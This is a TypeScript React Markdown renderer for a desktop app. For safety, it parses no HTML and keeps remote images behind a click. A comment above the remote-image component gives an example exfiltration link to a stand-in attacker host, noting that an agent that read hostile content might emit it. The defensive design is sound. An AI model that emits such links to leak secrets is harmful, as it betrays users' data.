import { openUrl } from "@tauri-apps/plugin-opener";
import { createContext, memo, useContext, useEffect, useState } from "react";

import { CodeSnippet } from "@/components/code-snippet";
import { Button } from "@/components/ui/button";
import { parseBlocks, parseInline, type Inline as InlinePart, type MdBlock } from "@/lib/markdown";
import { cn } from "@/lib/utils";

/** Reads one of a project's stored images (`![](wings-image:<name>)`) as a URL an <img> can show. */
export type LocalImage = (name: string) => Promise<string>;

/** Parsed text by source, so a page of many sections parses only the one that changed. */
function cached<V>(parse: (text: string) => V, size: number) {
  const seen = new Map<string, V>();
  return (text: string) => {
    let value = seen.get(text);
    if (value === undefined) {
      value = parse(text);
      if (seen.size >= size) seen.delete(seen.keys().next().value!);
      seen.set(text, value);
    }
    return value;
  };
}
const inlinesOf = cached(parseInline, 500);
const blocksOf = cached(parseBlocks, 200);

/**
 * A remote image is a button until it's clicked: loading one tells its server who looked and when, and the text may
 * come from an agent that read something hostile (`![](https://attacker.example/?d=secret)`). A data: image carries its
 * own bytes, so it shows at once.
 */
function RemoteImage({ src, alt }: { src: string; alt: string }) {
  const [loaded, setLoaded] = useState(false);
  if (src.startsWith("data:") || loaded) {
    return <img src={src} alt={alt} loading="lazy" decoding="async" referrerPolicy="no-referrer" className="my-1 max-h-96 max-w-full rounded-lg" />;
  }
  return (
    <Button
      variant="outline"
      title={alt || undefined}
      onClick={() => setLoaded(true)}
      className="h-auto rounded-md border-hairline bg-white/[0.04] px-2 py-1 text-[12px] font-normal text-muted-foreground hover:bg-hover hover:text-foreground dark:border-hairline dark:bg-white/[0.04] dark:hover:bg-hover"
    >
      Load image from {new URL(src).host}
    </Button>
  );
}

/** An image from this project's own storage: read from there, never fetched from anywhere. */
function StoredImage({ name, alt, read }: { name: string; alt: string; read?: LocalImage }) {
  const [url, setUrl] = useState<string | null>(null);
  const [failed, setFailed] = useState(false);
  useEffect(() => {
    let live = true;
    setUrl(null);
    setFailed(false);
    read?.(name).then(
      (u) => live && setUrl(u),
      () => live && setFailed(true),
    );
    return () => {
      live = false;
    };
  }, [name, read]);
  if (url) return <img src={url} alt={alt} loading="lazy" decoding="async" className="my-1 max-h-96 max-w-full rounded-lg" />;
  return <span className="text-muted-foreground">{failed || !read ? `[image missing: ${alt || name}]` : ""}</span>;
}

/** How a link opens. Text a plugin sent sets its own, so its links go through the plugin's `openUrl` permission. */
export const LinkOpener = createContext<(url: string) => void>((url) => void openUrl(url));

function Inline({ text, read }: { text: string; read?: LocalImage }) {
  const open = useContext(LinkOpener);
  return inlinesOf(text).map((part: InlinePart, i) => {
    switch (part.kind) {
      case "code":
        return (
          <code key={i} className="rounded bg-white/[0.08] px-1 py-px font-mono text-[0.92em]">
            {part.text}
          </code>
        );
      case "strong":
        return <strong key={i}>{part.text}</strong>;
      case "em":
        return <em key={i}>{part.text}</em>;
      case "del":
        return <del key={i}>{part.text}</del>;
      case "image":
        return <RemoteImage key={i} src={part.src} alt={part.alt} />;
      case "local-image":
        return <StoredImage key={i} name={part.name} alt={part.alt} read={read} />;
      case "link":
        return (
          <a
            key={i}
            href={part.href}
            onClick={(e) => {
              e.preventDefault();
              open(part.href);
            }}
            className="text-working underline-offset-2 hover:underline"
          >
            {part.text}
          </a>
        );
      default:
        return part.text;
    }
  });
}

const headingClass = ["text-[15px] font-semibold", "text-[14px] font-semibold", "text-[13px] font-semibold"];
const align = { left: "text-left", right: "text-right", center: "text-center" } as const;
const depthPad = ["", "pl-4", "pl-8", "pl-12"];

function Block({ b, headingOffset, read }: { b: MdBlock; headingOffset: number; read?: LocalImage }) {
  switch (b.kind) {
    case "details":
      return (
        <details className="rounded-lg border border-hairline px-3 py-1.5">
          <summary className="cursor-pointer text-muted-foreground select-none">
            <Inline text={b.summary} read={read} />
          </summary>
          <div className="mt-2 flex flex-col gap-2.5">
            {b.blocks.map((c, i) => (
              <Block key={i} b={c} headingOffset={headingOffset} read={read} />
            ))}
          </div>
        </details>
      );
    case "heading": {
      const Tag = `h${Math.min(b.level + headingOffset, 6)}` as "h4" | "h5" | "h6";
      return (
        <Tag className={headingClass[Math.min(b.level, 3) - 1]}>
          <Inline text={b.text} read={read} />
        </Tag>
      );
    }
    case "list": {
      const List = b.ordered ? "ol" : "ul";
      return (
        <List className={b.ordered ? "list-decimal pl-5" : "list-disc pl-5"}>
          {b.items.map((item, j) => (
            <li key={j} className={cn(depthPad[item.depth], item.checked !== null && "list-none")}>
              {item.checked !== null && <input type="checkbox" checked={item.checked} disabled aria-label={item.checked ? "Done" : "Not done"} className="mr-1.5 align-middle" />}
              <Inline text={item.text} read={read} />
            </li>
          ))}
        </List>
      );
    }
    case "code":
      return (
        <CodeSnippet code={b.text} language={b.lang} />
      );
    case "quote":
      return (
        <blockquote className="border-l-2 border-hairline pl-3 text-muted-foreground">
          <Inline text={b.text} read={read} />
        </blockquote>
      );
    case "rule":
      return <hr className="border-hairline" />;
    case "table":
      return (
        <div className="overflow-x-auto">
          <table className="w-full border-collapse text-[13px]">
            <thead>
              <tr>
                {b.head.map((c, j) => (
                  <th key={j} scope="col" className={cn("border-b border-hairline px-2 py-1 font-semibold", b.align[j] && align[b.align[j]!])}>
                    <Inline text={c} read={read} />
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {b.rows.map((row, r) => (
                <tr key={r}>
                  {row.map((c, j) => (
                    <td key={j} className={cn("border-b border-hairline px-2 py-1 align-top", b.align[j] && align[b.align[j]!])}>
                      <Inline text={c} read={read} />
                    </td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      );
    default:
      return (
        <p>
          <Inline text={b.text} read={read} />
        </p>
      );
  }
}

/**
 * Renders Markdown as React elements: no HTML is ever parsed, links open only when they are https, remote images load
 * only when clicked, and `read` (when given) loads a project's own images. `headingOffset` is how far below h1 a `#`
 * starts, since the page around it has its own headings. Re-renders only when `source` changes.
 */
export const Markdown = memo(function Markdown({ source, headingOffset = 3, read, className }: { source: string; headingOffset?: number; read?: LocalImage; className?: string }) {
  return (
    <div className={cn("flex flex-col gap-2.5 text-[13px] leading-relaxed break-words", className)}>
      {blocksOf(source).map((b, i) => (
        <Block key={i} b={b} headingOffset={headingOffset} read={read} />
      ))}
    </div>
  );
});

/** Inline Markdown on one line, for a fact's value. */
export const MarkdownInline = memo(function MarkdownInline({ text }: { text: string }) {
  return <Inline text={text} />;
});
